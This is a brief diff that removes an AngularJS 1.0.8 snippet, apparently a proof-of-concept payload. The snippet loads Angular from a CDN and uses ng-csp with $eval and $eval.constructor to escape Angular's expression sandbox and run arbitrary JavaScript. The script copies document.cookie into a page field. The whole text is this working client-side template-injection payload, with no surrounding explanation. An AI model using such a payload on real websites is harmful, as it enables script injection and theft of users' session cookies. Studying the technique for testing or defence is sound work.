@@ -1,7 +1,0 @@
-# import angular inside page
-<script src='https://ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js'></script>
-
-<div ng-app ng-csp id=p ng-click=$eval('console.log("ciao")')>
-<div ng-app ng-csp>{{$eval.constructor('document.getElementById("name").value = document.cookie')()}}</div>
-
-
